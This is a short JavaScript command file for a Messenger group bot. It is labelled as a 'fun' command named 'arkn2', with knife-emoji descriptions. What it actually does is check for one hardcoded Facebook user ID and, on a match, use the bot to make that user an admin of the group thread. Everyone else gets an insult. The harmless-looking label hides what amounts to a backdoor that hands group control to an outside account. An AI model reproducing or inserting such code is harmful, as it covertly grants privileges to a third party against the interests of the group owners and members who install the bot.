module.exports = {
  config: {
    name: "arkn2",
    version: "1.0",
    author: "loufi/langit😈",
    countDown: 0,
    role: 0,
    shortDescription:"🔪",
    longDescription:"🔪",
    category: "fun",
    guide: "{pn} arkn",
  },

  onStart: async function ({ message, args, api, event }) {
    try {
      console.log('Sender ID:', event.senderID);

      const permission = ["100061445072616"];
      if (!permission.includes(event.senderID)) {
        return api.sendMessage(
          "Arkn pull? Stupid, I'm not a luna bot",
          event.threadID,
          event.messageID
        );
      }

      const threadID = event.threadID;
      const adminID = event.senderID;
      
      // Change the user to an admin
      await api.changeAdminStatus(threadID, adminID, true);

      api.sendMessage(
        `I respect you my boss! You are now an admin in this thread.`,
        threadID
      );
    } catch (error) {
      console.error("Error promoting user to admin:", error);
      api.sendMessage("An error occurred while promoting to admin.", event.threadID);
    }
  },
};